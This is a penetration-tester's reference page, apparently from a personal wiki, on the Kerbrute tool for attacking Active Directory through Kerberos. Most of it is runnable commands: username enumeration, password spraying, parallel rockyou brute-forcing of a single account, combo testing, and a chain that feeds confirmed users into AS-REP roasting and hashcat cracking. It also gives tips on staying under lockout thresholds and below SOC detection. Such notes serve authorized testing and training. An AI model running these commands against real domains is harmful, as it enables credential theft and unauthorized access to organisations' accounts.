---
title: "Kerbrute"
type: tool
tags: [active-directory, kerberos, username-enumeration, password-spraying, pre-auth, osint, credentials]
date_created: 2026-07-02
date_updated: 2026-07-02
sources: []
phase: recon
---

# Kerbrute

## Purpose

Kerbrute is a Go tool that abuses Kerberos pre-authentication to enumerate valid Active Directory usernames and to spray or brute-force passwords, all by talking only to the KDC (port 88/UDP) on a Domain Controller. Because a pre-auth AS-REQ for a non-existent user returns a different KDC error (`PRINCIPAL_UNKNOWN`) than one for a valid user (`PREAUTH_REQUIRED`), Kerbrute can confirm which usernames exist without ever submitting a password, so it generates no failed-logon events and locks out no accounts during enumeration.

## Installation

Precompiled binaries (per-OS/arch) are on the releases page: `https://github.com/ropnop/kerbrute/releases`

Common binary names: `kerbrute_linux_amd64`, `kerbrute_linux_386`, `kerbrute_windows_amd64.exe`, `kerbrute_darwin_amd64`.

```bash
# Download and stage a Linux binary
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
```

Build from source (Go toolchain required):

```bash
# Install directly with Go
go install github.com/ropnop/kerbrute@latest

# Or clone and build all platform binaries
git clone https://github.com/ropnop/kerbrute
cd kerbrute
make all        # outputs Windows, Linux, and macOS x86/x64 binaries to ./dist
```

## Core usage

Kerbrute has four subcommands: `userenum`, `passwordspray`, `bruteuser`, and `bruteforce`.

### Global flags

| Flag | Purpose |
|---|---|
| `-d, --domain` | Target domain (required, e.g. `lab.ropnop.com`) |
| `--dc` | Domain Controller IP or hostname (skips DNS SRV lookup) |
| `-t, --threads` | Thread count (default 10) |
| `-o, --output` | Write results to a log file |
| `-v, --verbose` | Log failures as well as successes |
| `--delay` | Milliseconds between attempts (forces single-threaded) |
| `--safe` | Abort all threads if any account lockout is detected |

Always pass `--dc <DC_IP>` on an internal engagement so resolution does not depend on your attacker box being pointed at the domain DNS.

### userenum: validate usernames

```bash
# Enumerate valid usernames from a wordlist against a domain
./kerbrute userenum -d lab.ropnop.com --dc 10.10.10.5 usernames.txt

# Save valid users to a file for the next stage
./kerbrute userenum -d lab.ropnop.com --dc 10.10.10.5 -o valid_users.txt usernames.txt
```

Valid users are printed as `[+] VALID USERNAME: user@domain`. Feed a curated list (from OSINT, a SecLists name list like `xato-net-10-million-usernames.txt`, or generated `first.last`/`flast` permutations).

### passwordspray: one password, many users

```bash
# Spray a single password across a validated user list, aborting on lockout
./kerbrute passwordspray -d lab.ropnop.com --dc 10.10.10.5 --safe valid_users.txt 'Autumn2026!'

# Throttled spray (1500ms between attempts, single-threaded) to stay under lockout thresholds
./kerbrute passwordspray -d lab.ropnop.com --dc 10.10.10.5 --delay 1500 valid_users.txt 'Welcome123'
```

Hits print `[+] VALID LOGIN: user@domain:password`. Always spray with `--safe` and respect the domain lockout policy (attempts per user per observation window); one carefully chosen password across all users beats many passwords against one user.

### bruteuser: many passwords, one user

```bash
# Brute-force a single known account from a password list
./kerbrute bruteuser -d lab.ropnop.com --dc 10.10.10.5 passwords.lst thoffman
```

This will lock the account if the policy is strict; reserve it for accounts with no lockout (some service accounts) or when you know the policy allows it.

**Confirm lockout is disabled before a big brute.** If tens of guesses against one account keep
returning `STATUS_LOGON_FAILURE` (never `STATUS_ACCOUNT_LOCKED_OUT`), lockout is effectively off and a
full rockyou brute of that single user is viable (common on CTF/AD intro boxes where a web page leaks
one username). A single Kerberos AS-REQ per guess makes `bruteuser` the fastest option.

**Parallelise across wordlist chunks to multiply throughput.** One `bruteuser` process is throughput-
bound by the DC's AS-REQ handling (observed ~200/sec over a lab VPN). rockyou is 14M lines, so split it
and run several processes at once (each hits the KDC on its own connections; lockout stays off):

```bash
split -l 3600000 /usr/share/wordlists/rockyou.txt /tmp/rychunk_
for c in /tmp/rychunk_*; do
  kerbrute bruteuser -d DOMAIN --dc DC_IP -t 40 "$c" TARGETUSER -o "hit_$(basename $c).txt" >"log_$(basename $c)" 2>&1 &
done
# poll the hit files for the exact success string
grep -l "VALID LOGIN" /tmp/hit_* 2>/dev/null
```

### bruteforce: username:password combos

```bash
# Test explicit user:pass pairs from a file
./kerbrute bruteforce -d lab.ropnop.com --dc 10.10.10.5 combos.lst

# Or stream combos from stdin (note the trailing '-')
cat combos.lst | ./kerbrute bruteforce -d lab.ropnop.com --dc 10.10.10.5 -
```

Use when you have candidate pairs (e.g. reused creds from a breach dump) rather than a spray matrix.

## Common use cases

- **Bootstrapping a domain foothold from a name list.** Run `userenum` first to turn a noisy OSINT name list into a confirmed user list, then `passwordspray` a seasonal/default password. See [[ad-enumeration]] and [[password-spraying]].

- **Feeding valid users straight into AS-REP roasting.** Every confirmed username is a candidate for a Kerberos pre-auth check: accounts with `DONT_REQ_PREAUTH` set return an AS-REP whose encrypted portion is crackable offline. Pipe Kerbrute's validated list into Impacket's `GetNPUsers.py` (see [[impacket]]), then crack with [[hashcat]] or [[john]]. Full workflow in [[roasting-asrep-roasting]].

```bash
# 1. Kerbrute confirms who exists
./kerbrute userenum -d lab.ropnop.com --dc 10.10.10.5 -o valid_users.txt usernames.txt

# 2. Impacket asks the KDC which of them skip pre-auth (no creds needed)
GetNPUsers.py lab.ropnop.com/ -dc-ip 10.10.10.5 -usersfile valid_users.txt -no-pass -format hashcat -outputfile asrep.hash

# 3. Crack the $krb5asrep$ hashes offline
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

- **Low-noise pre-engagement recon.** Because `userenum` never submits a password, it is the quiet way to size up the user population before any lockout-risky action. Broader Kerberos abuse chains (Kerberoasting, delegation) are in [[kerberos-attacks]] and [[roasting-kerberoasting]].

- **Validating sprayed hits with another tool.** Confirm a Kerbrute `VALID LOGIN` against SMB/LDAP and pull group membership with [[netexec]] before spraying wider.

## Tips and gotchas

- **Enumeration is safe, spraying is not.** `userenum` submits no passwords and cannot lock accounts. `passwordspray`, `bruteuser`, and `bruteforce` all submit real AS-REQs with a password guess and count toward the lockout policy. Always add `--safe` and know the `LockoutThreshold` / `LockoutObservationWindow` before spraying.

- **Read the lockout policy first.** Pull it with `netexec smb <DC> -u user -p pass --pass-pol` or from GPO. Set `--delay` and per-run guess count so you never exceed threshold within the observation window (a common safe rule: threshold minus 1 attempt per window).

- **Clock skew breaks Kerberos.** If AS-REQs fail with `KRB_AP_ERR_SKEW (Clock skew too great)`, sync to the DC: `sudo ntpdate <DC_IP>` (or `sudo rdate -n <DC_IP>`). Kerberos tolerates roughly 5 minutes of drift.

- **Pass `--dc` explicitly.** Without it, Kerbrute relies on a DNS SRV lookup for the KDC, which fails when your resolver is not the domain DNS. On an internal box, always give `--dc <DC_IP>`.

- **UDP vs TCP.** Kerbrute talks to 88/UDP by default. Some hardened KDCs or firewalls only pass 88/TCP; if every request times out but the DC is up, that is usually the cause.

- **Username formats matter.** AD accepts `sAMAccountName` (e.g. `jsmith`), not `first.last` display names, for pre-auth. Generate the right permutations (`flast`, `first.last`, `f.last`) and let `userenum` tell you which format the domain uses.

- **Stealthy, not invisible.** `userenum` avoids 4625 (failed logon) events, but a flood of AS-REQs still shows as 4768 (TGT requested) with failure codes on the DC. Throttle with `-t` and `--delay` if a SOC is watching Kerberos event volume.

- **Watching a brute for the hit - two pitfalls.** Without `-v`, `bruteuser` prints nothing until it
  finishes (and `-o` logs only the successful hit), so you cannot see progress; run with `-v` and tail
  the log, or just poll the `-o` hit file for the exact success token `VALID LOGIN`. Do **not** grep
  case-insensitively for `"valid password"` to detect a hit - kerbrute's failure line is
  `... - Invalid password`, and `grep -i "valid password"` matches `In**valid password**`, a false
  positive. Match `VALID LOGIN` (the hit line) or `Valid password` case-sensitively.

- **Harvest the username list from the target's own site.** A company website's team/about/contact page
  (staff names, a `first.last@domain` email) gives the naming convention. Generate `f.last`, `flast`,
  `first.last`, and `last` permutations of every name and let `userenum` confirm which exist - filler
  names in a stock template will simply not validate, and a leaked email like `j.doe@domain` pins the
  format.

- **VPN/DNS drops.** Running `ntpdate` against the DC can bounce your VPN; reconnect and re-run. Keep the validated user list saved with `-o` so a dropped session does not cost the enumeration work.

## Related

- [[roasting-asrep-roasting]]: turn validated users into crackable AS-REP hashes
- [[password-spraying]]: lockout-aware spraying methodology
- [[ad-enumeration]]: where a validated user list fits in the AD kill chain
- [[kerberos-attacks]]: broader Kerberos abuse (Kerberoast, delegation, tickets)
- [[roasting-kerberoasting]]: SPN-based offline cracking, the follow-on to a valid cred
- [[impacket]]: `GetNPUsers.py` for the AS-REP roast step
- [[netexec]]: validate hits and pull the lockout policy / group membership
- [[hashcat]], [[john]]: crack the resulting `$krb5asrep$` hashes

## Sources

- Kerbrute GitHub: https://github.com/ropnop/kerbrute
